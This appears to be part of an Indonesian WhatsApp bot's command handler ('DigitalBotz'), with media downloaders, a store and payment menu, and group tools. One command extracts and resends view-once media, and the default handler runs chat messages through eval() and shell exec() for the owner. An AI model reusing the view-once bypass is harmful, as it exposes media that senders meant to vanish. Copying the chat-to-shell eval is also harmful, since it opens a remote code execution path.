const audio=await xeonaudp3.mp3(text)
await AlwaysFaxzMd.sendMessage(m.chat,{
    audio: fs.readFileSync(audio.path),
    mimetype: 'audio/mp4', ptt: true,
    contextInfo:{
        externalAdReply:{
            title:audio.meta.title,
            body: botname,
            thumbnail: await fetchBuffer(audio.meta.image),
            mediaType:2,
            mediaUrl:text,
        }
    },
},{quoted:m})
await fs.unlinkSync(audio.path)
break
case 'ytmp4': case 'ytvideo': {
const xeonvidoh = require('./lib/ytdl2')
if (args.length < 1 || !isUrl(text) || !xeonvidoh.isYTUrl(text)) replyalwaysfaxz(`Where is the link??\n\nExample : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`)
const vid=await xeonvidoh.mp4(text)
const ytc=`
*${themeemoji}Tittle:* ${vid.title}
*${themeemoji}Date:* ${vid.date}
*${themeemoji}Duration:* ${vid.duration}
*${themeemoji}Quality:* ${vid.quality}`
await AlwaysFaxzMd.sendMessage(m.chat,{
    video: {url:vid.videoUrl},
    caption: ytc
},{quoted:m})
}
break
case 'sound1':
case 'sound2':
case 'sound3':
case 'sound4':
case 'sound5':
case 'sound6':
case 'sound7':
case 'sound8':
case 'sound9':
case 'sound10':
case 'sound11':
case 'sound12':
case 'sound13':
case 'sound14':
case 'sound15':
case 'sound16':
case 'sound17':
case 'sound18':
case 'sound19':
case 'sound20':
case 'sound21':
case 'sound22':
case 'sound23':
case 'sound24':
case 'sound25':
case 'sound26':
case 'sound27':
case 'sound28':
case 'sound29':
case 'sound30':
case 'sound31':
case 'sound32':
case 'sound33':
case 'sound34':
case 'sound35':
case 'sound36':
case 'sound37':
case 'sound38':
case 'sound39':
case 'sound40':
case 'sound41':
case 'sound42':
case 'sound43':
case 'sound44':
case 'sound45':
case 'sound46':
case 'sound47':
case 'sound48':
case 'sound49':
case 'sound50':
case 'sound51':
case 'sound52':
case 'sound53':
case 'sound54':
case 'sound55':
case 'sound56':
case 'sound57':
case 'sound58':
case 'sound59':
case 'sound60':
case 'sound61':
case 'sound62':
case 'sound63':
case 'sound64':
case 'sound65':
case 'sound66':
case 'sound67':
case 'sound68':
case 'sound69':
case 'sound70':
case 'sound71':
case 'sound72':
case 'sound73':
case 'sound74':
case 'sound75':
case 'sound76':
case 'sound77':
case 'sound78':
case 'sound79':
case 'sound80':
case 'sound81':
case 'sound82':
case 'sound83':
case 'sound84':
case 'sound85':
case 'sound86':
case 'sound87':
case 'sound88':
case 'sound89':
case 'sound90':
case 'sound91':
case 'sound92':
case 'sound93':
case 'sound94':
case 'sound95':
case 'sound96':
case 'sound97':
case 'sound98':
case 'sound99':
case 'sound100':
case 'sound101':
case 'sound102':
case 'sound103':
case 'sound104':
case 'sound105':
case 'sound106':
case 'sound107':
case 'sound108':
case 'sound109':
case 'sound110':
case 'sound111':
case 'sound112':
case 'sound113':
case 'sound114':
case 'sound115':
case 'sound116':
case 'sound117':
case 'sound118':
case 'sound119':
case 'sound120':
case 'sound121':
case 'sound122':
case 'sound123':
case 'sound124':
case 'sound125':
case 'sound126':
case 'sound127':
case 'sound128':
case 'sound129':
case 'sound130':
case 'sound131':
case 'sound132':
case 'sound133':
case 'sound134':
case 'sound135':
case 'sound136':
case 'sound137':
case 'sound138':
case 'sound139':
case 'sound140':
case 'sound141':
case 'sound142':
case 'sound143':
case 'sound144':
case 'sound145':
case 'sound146':
case 'sound147':
case 'sound148':
case 'sound149':
case 'sound150':
case 'sound151':
case 'sound152':
case 'sound153':
case 'sound154':
case 'sound155':
case 'sound156':
case 'sound157':
case 'sound158':
case 'sound159':
case 'sound160':
case 'sound161':
AlwaysFaxzMd_dev = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
await AlwaysFaxzMd.sendMessage(m.chat, { audio: AlwaysFaxzMd_dev, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
break
case 'readviewonce': case 'rvo': {
	if (!m.quoted) return replyalwaysfaxz(`Reply to view once message`)
	if (m.quoted.mtype !== 'viewOnceMessageV2') return replyalwaysfaxz(`This is not a view once message`)
    let msg = m.quoted.message
    let type = Object.keys(msg)[0]
    let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : 'video')
    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        return AlwaysFaxzMd.sendFile(m.chat, buffer, 'media.mp4', msg[type].caption || '', m)
    } else if (/image/.test(type)) {
        return AlwaysFaxzMd.sendFile(m.chat, buffer, 'media.jpg', msg[type].caption || '', m)
    }
}
break
case 'clearchat':
xeonimun('\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n')
break
           
            case 'acumalaka': {
            await loading()
            const faxzsygnindya = `\n*\`[ # ]\`* *Hay 👋 _${pushname}_ ,Selamat Datang Di Menu Bot DigitalBotz\n\n> [ # ] ★ *Baca Selengkapnya Untuk Melihat Menu*\n͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏\n╭┈➤ *\`AlwaysFaxz-DigitalBotz\`*
|
> ★ *Nama : _${pushname}_*
> ★ *Creator : _★ ÂlwâysFaxz ★_*
> ★ *Prefix : Multi*
> ★ *Type Sc : MD - DigitalBotz*
|
╰┈➤ *\`[ Botz Multi Fungsi ]\`*

> //========================//
*\`[ # ]\`* _Sumber Script_
> https://whatsapp.com/channel/0029VadfaUY2v1IsC78Cqa2z
> //=======================//

> *[ Hey You Welcome ]*
╭┈➤ *\`★ Store menu ★\`*
> trxdone
> trx-on
> payment
╰┈➤ *\`★ Panel Menu ★\`*
> menuinstaller
> ramlist 
> cadmin 
> listusr 
> listsrv 
> delusr 
> delsrv 
> listprem
╰┈➤ *\`★ Others Menu ★\`*
> bcgc 
> pinrest/pin
> s
> addstiker
> ai/openai 
> hdr/hd 
> telestick
> togif
> tovn
> tourl
> tomp4
> toimage
> tomp3
> smeme
> toaudio/toaud
> add+format [ format = (apk,zip,,dll) ] contoh *addzip*
╰┈➤ *\`★ Owner Menu ★\`*
> listdomain
> autoswview
> runtime
> restart
> block / unblock
> delsession
> mode <public/self>
> setppgw
> autoread
> autotyping
> join
╰┈➤ *\`★ Group Menu ★\`*
> tagall
> kick
> leave
> add
> setppgc
> totag
> opentime/closetime
> gc <open/close>
> linkgc
╰┈➤ *\`★ Download Menu ★\`*
> readvo = sikat
> yts 
> play 
> dlaud/dlaudio
> ytmp4
> ytmp3 = slebew2 (jika ytmp3 eror pakai slebew2)
> sound1 - sound161
╰┈➤ *\`★ Akses Menu ★\`*
> addowner
> addprem
╰┈➤ *\`★ Global Informations ★\`*
> owner
╰========================➤

*_©ÂlwâysFâxz_*\n`
          
          let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: faxzsygnindya
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./lib/system/thumb.jpg')}, { upload: AlwaysFaxzMd.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
										"name": "cta_url",
										"buttonParamsJson": `{\"display_text\":\"BUY SCRIPT\",\"url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+Saya+Mau+Buy+Sc+DigitalBotz\",\"merchant_url\":\"https://wa.me/6283116555026?text=*AlwaysFaxz*+Saya+Mau+Buy+Sc+DigitalBotz\"}`
									},
									{
										"name": "quick_reply",
										"buttonParamsJson": `{\"display_text\":\"KEMBALI\",\"id\":\".menu\"}`
									},
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363294318768415@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})
  
await AlwaysFaxzMd.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})

  } faxzsygnindya = fs.readFileSync('./lib/crash.mp3')
AlwaysFaxzMd.sendMessage(m.chat, {audio: faxzsygnindya, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
break
                case 'trxdone': case 'done': {
if (!isFaxzCreator) return replyalwaysfaxz(`*\`[ # ]\`* _Khusus Faxz_`)
let t = text.split(',');
await AlwaysFaxzMd.sendMessage(m.chat, { react: { text: '❌', key: m.key }})
if (t.length < 2) return replyalwaysfaxz(`*Format salah!*
Penggunaan:
${prefix + command} barang,nominal,sistem, paymentt`);
let barang = t[0];
let nominal = t[1];
let sistem = t[2];
let paymentt = t[3];
await AlwaysFaxzMd.sendMessage(m.chat, { react: { text: '💸', key: m.key }})
await AlwaysFaxzMd.sendMessage(m.chat, { react: { text: '✅', key: m.key }})
var tekz = `> TRX DONE 💸`
const url = fs.readFileSync("./lib/system/thumb.jpg")
async function image(url) {
  const { imageMessage } = await generateWAMessageContent({
    image: {
      url
    }
  }, {
    upload: AlwaysFaxzMd.waUploadToServer
  });
  return imageMessage;
}
let msg = generateWAMessageFromContent(
  m.chat,
  {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: tekz
          },
          carouselMessage: {
            cards: [
              {
                header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: './lib/system/done1.jpg' } }, { upload: AlwaysFaxzMd.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: ownername,
          hasMediaAttachment: false
        }),
                body: {
                  text: `
┏───────────────┈ 
┆ 「 *\`[ALL TESTIMONI]\`* 」
┣───────────────┈ 
┣──=[ *\`[ Rincian Trx ]]\`* ]==─
> //========================//
> _•📦 *Barang:* ${barang}_
> _•💸 *Nominal:* Rp${nominal}_
> _•💳 *Payment:* ${paymentt}_
> _•⚙ *Sistem:* ${sistem}_
> 😈 \`々 𝐴𝑙𝑤𝑎𝑦𝑠 𝐹𝑎𝑥𝑧 々\` 😈
> <====⟬ \`Zona Nyaman\` ⟭====>
> Nama Store : ${global.namastore}
> => contact me : di bawah text ini ↓
> 1. https://wa.me/6285809388803  
> 2. https://wa.me/6283116555026
> \`All Done No Reff,Next Trx Boss\`
> _Be Smart Buyer & Seller_
> //========================//
> © AlwaysFaxz
└────────────┈ ⳹`
                },
                nativeFlowMessage: {
                  buttons: [
                    {
                      name: "cta_url",
                      buttonParamsJson: `{"display_text":"📃 My Chanel (1)","url":"https://whatsapp.com/channel/0029VadfaUY2v1IsC78Cqa2z","merchant_url":"https://whatsapp.com/channel/0029VadfaUY2v1IsC78Cqa2z"}`
                    },
                  ],
                },
              },
              {
                header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: './lib/system/done2.jpg' } }, { upload: AlwaysFaxzMd.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: ownername,
          hasMediaAttachment: false
        }),
                body: {
                  text: `
┏───────────────┈ 
┆ 「 *\`[ ALL TESTIMONI ]\`* 」
┣───────────────┈ 
┣──=[ *\`[ Rincian Trx ]]\`* ]==─
> //========================//
> _•📦 *Barang:* ${barang}_
> _•💸 *Nominal:* Rp${nominal}_
> _•💳 *Payment:* ${paymentt}_
> _•⚙ *Sistem:* ${sistem}_
> 😈 \`々 𝐴𝑙𝑤𝑎𝑦𝑠 𝐹𝑎𝑥𝑧 々\` 😈
> <====⟬ \`Zona Nyaman\` ⟭====>
> Nama Store : ${global.namastore}
> => contact me : di bawah text ini ↓
> 1. https://wa.me/6285809388803  
> 2. https://wa.me/6283116555026
> \`All Done No Reff,Next Trx Boss\`
> _Be Smart Buyer & Seller_
> //=======================//
> © AlwaysFaxz
└────────────┈ ⳹`
                },
                nativeFlowMessage: {
                  buttons: [
                    {
                      name: "cta_url",
                      buttonParamsJson: `{"display_text":"📃 My Chanel (2)","url":"https://whatsapp.com/channel/0029Vaj7Lm860eBiYWgyTb3p","merchant_url":"https://whatsapp.com/channel/0029Vaj7Lm860eBiYWgyTb3p"}`
                    },
                  ],
                },
              },
            ],
            messageVersion: 1,
          },
        },
      },
    },
  },
  {}
);

await AlwaysFaxzMd.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id,
});

}
break
case 'pay':
case 'payment': {
if (!isFaxzCreator) return replyalwaysfaxz(`*\`[ # ]\`* Khusus Faxz`)
await AlwaysFaxzMd.sendMessage(m.chat, { react: { text: `💸`, key: m.key }})
const url = "https://telegra.ph/file/1d73626adf770c710b731.jpg"
async function image(url) {
const { imageMessage } = await generateWAMessageContent({
    image: { url }
  }, {
    upload: AlwaysFaxzMd.waUploadToServer
  })
  return imageMessage
}
    let msg = generateWAMessageFromContent(
      m.chat,
      {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              body: {
                text: `> 📌 ʙᴇʀɪᴋᴜᴛ ʟɪsᴛ ᴘᴀʏᴍᴇɴᴛ sᴀʏᴀ ʏᴀʜ` },
              carouselMessage: {
                cards: [
                  {
                    header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: './lib/system/payment/dana.jpg' } }, { upload: AlwaysFaxzMd.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: ownername,
          hasMediaAttachment: false
        }),
                    body: { text: `> CLICK BUTTON DANA DIBAWAH\n> DANA A/N : M••••M`},
                    nativeFlowMessage: {
                      buttons: [
                        {
                 "name": "cta_copy",
                 "buttonParamsJson": "{\"display_text\":\"ᴘᴀʏʏᴍᴇɴᴛ ᴅᴀɴᴀ\",\"id\":\"123456789\",\"copy_code\":\"085809388803\"}"
              },
                      ],
                    },
                  },
                  {
                    header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: './lib/system/payment/gopay.jpg' } }, { upload: AlwaysFaxzMd.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: ownername,
          hasMediaAttachment: false
        }),
                    body: { text: `> CLICK BUTTON GOPAY DIBAWAH\n> GOPAY A/N : g ada + jan salin tar nyesel`},
                    nativeFlowMessage: {
                      buttons: [
                        {
                 "name": "cta_copy",
                 "buttonParamsJson": "{\"display_text\":\"ᴘᴀʏʏᴍᴇɴᴛ gopay\",\"id\":\"123456789\",\"copy_code\":\"DIBILANG GA ADA MEMEK NGEYEL AMAT KONTOL\"}"
              },
                      ],
                    },
                  },
                  {                   
                    header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: './lib/system/payment/qris.jpg' } }, { upload: AlwaysFaxzMd.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: ownername,
          hasMediaAttachment: false
        }),
                    body: { text: `> CLICK BUTTON`},
                    nativeFlowMessage: {
                      buttons: [
                        {
                 "name": "cta_url",
                 "buttonParamsJson": `{\"display_text\":\"ᴘᴀʏʏᴍᴇɴᴛ ǫʀɪs\",\"url\":\"https://wa.me/6283116555026?text=send+qr+all+pay+bg+nominal+(nominalmya)\",\"merchant_url\":\"https://www.google.com\"}`
              },
                      ],
                    },
                  },                                    
                ],
                messageVersion: 1,
              },
            },
          },
        },
      },
      { quoted: fkontak }
    );
    await AlwaysFaxzMd.relayMessage(msg.key.remoteJid, msg.message, {
      messageId: msg.key.id,
    });
}
break
           case 'menu': {
           await AlwaysFaxzMd.sendMessage(m.chat, { react: { text: `📌`, key: m.key }})
const url = "https://telegra.ph/file/1d73626adf770c710b731.jpg"
async function image(url) {
const { imageMessage } = await generateWAMessageContent({
    image: { url }
  }, {
    upload: AlwaysFaxzMd.waUploadToServer
  })
  return imageMessage
}
    let msg = generateWAMessageFromContent(
      m.chat,
      {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              body: {
                text: `> Hay _${pushname}_ Perkenalkan Saya Adalah Bot Md Yg Bernama *DigitalBotz*` },
              carouselMessage: {
                cards: [
                  {
                    header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: './lib/system/menu1.jpg' } }, { upload: AlwaysFaxzMd.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: ownername,
          hasMediaAttachment: false
        }),
                    body: { text: `> TAMPILKAN MENU`},
                    nativeFlowMessage: {
                      buttons: [
                        {
										"name": "quick_reply",
										"buttonParamsJson": `{\"display_text\":\"TAMPILKAN MENU\",\"id\":\".acumalaka\"}`
									},
                      ],
                    },
                  },
                  {
                    header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: './lib/system/menu1.jpg' } }, { upload: AlwaysFaxzMd.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: ownername,
          hasMediaAttachment: false
        }),
                    body: { text: `> SPESIFIKASI SCRIPT`},
                    nativeFlowMessage: {
                      buttons: [
                         {
										"name": "quick_reply",
										"buttonParamsJson": `{\"display_text\":\"Spek\",\"id\":\".spek\"}`
									},
                      ],
                    },
                  },
                  {                   
                    header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: './lib/system/creator.jpg' } }, { upload: AlwaysFaxzMd.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: ownername,
          hasMediaAttachment: false
        }),
                    body: { text: `> LIHAT CREATOR`},
                    nativeFlowMessage: {
                      buttons: [
                        {
										"name": "quick_reply",
										"buttonParamsJson": `{\"display_text\":\"Creator\",\"id\":\".creator\"}`
									},
                      ],
                    },
                  },                                    
                ],
                messageVersion: 1,
              },
            },
          },
        },
      },
      { quoted: fkontak }
    );
    await AlwaysFaxzMd.relayMessage(msg.key.remoteJid, msg.message, {
      messageId: msg.key.id,
    });
  } nindya = fs.readFileSync('./lib/nindya.mp3')
AlwaysFaxzMd.sendMessage(m.chat, {audio: nindya, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
break
                case 'telestick': {
		if (args[0] && args[0].match(/(https:\/\/t.me\/addstickers\/)/gi)) {
		let xeonresources = await Telesticker(args[0])
		await replyalwaysfaxz(`Sending ${xeonresources.length} stickers...`)
		if (m.isGroup && xeonresources.length > 30) {
			await replyalwaysfaxz('Number of stickers more than 30, bot will send it in private chat.')
			for (let i = 0; i < xeonresources.length; i++) {
				AlwaysFaxzMd.sendMessage(m.sender, { sticker: { url: xeonresources[i].url }})
			}
		} else {
			for (let i = 0; i < xeonresources.length; i++) {
				AlwaysFaxzMd.sendMessage(m.chat, { sticker: { url: xeonresources[i].url }})
			}
		}
	} else replyalwaysfaxz(`Where is the telegram sticker link?\nExample. ${prefix + command} https://t.me/addstickers/FriendlyDeath`)
}
break
            default:
                if (budy.startsWith('=>')) {
                    if (!isFaxzCreator) return replyalwaysfaxz(mess.owner)

                    function Return(sul) {
                        sat = JSON.stringify(sul, null, 2)
                        bang = util.format(sat)
                        if (sat == undefined) {
                            bang = util.format(sul)
                        }
                        return replyalwaysfaxz(bang)
                    }
                    try {
                        replyalwaysfaxz(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
                    } catch (e) {
                        replyalwaysfaxz(String(e))
                    }
                }

                if (budy.startsWith('>')) {
                    if (!isFaxzCreator) return replyalwaysfaxz(mess.owner)
                    try {
                        let evaled = await eval(budy.slice(2))
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                        await replyalwaysfaxz(evaled)
                    } catch (err) {
                        await replyalwaysfaxz(String(err))
                    }
                }
                if (budy.startsWith('$')) {
                    if (!isFaxzCreator) return replyalwaysfaxz(mess.owner)
                    exec(budy.slice(2), (err, stdout) => {
                        if (err) return replyalwaysfaxz(err)
                        if (stdout) return replyalwaysfaxz(stdout)
                    })
                }
        }
    } catch (err) {
        console.log(util.format(err))
    }
}
let file = require.resolve(__filename)
fs.watchFile(file, () => {
    fs.unwatchFile(file)
    console.log(chalk.redBright(`Update ${__filename}`))
    delete require.cache[file]
    require(file)
})

process.on('uncaughtException', function (err) {
let e = String(err)
if (e.includes("conflict")) return
if (e.includes("Socket connection timeout")) return
if (e.includes("not-authorized")) return
if (e.includes("already-exists")) return
if (e.includes("rate-overlimit")) return
if (e.includes("Connection Closed")) return
if (e.includes("Timed Out")) return
if (e.includes("Value not found")) return
console.log('Caught exception: ', err)
})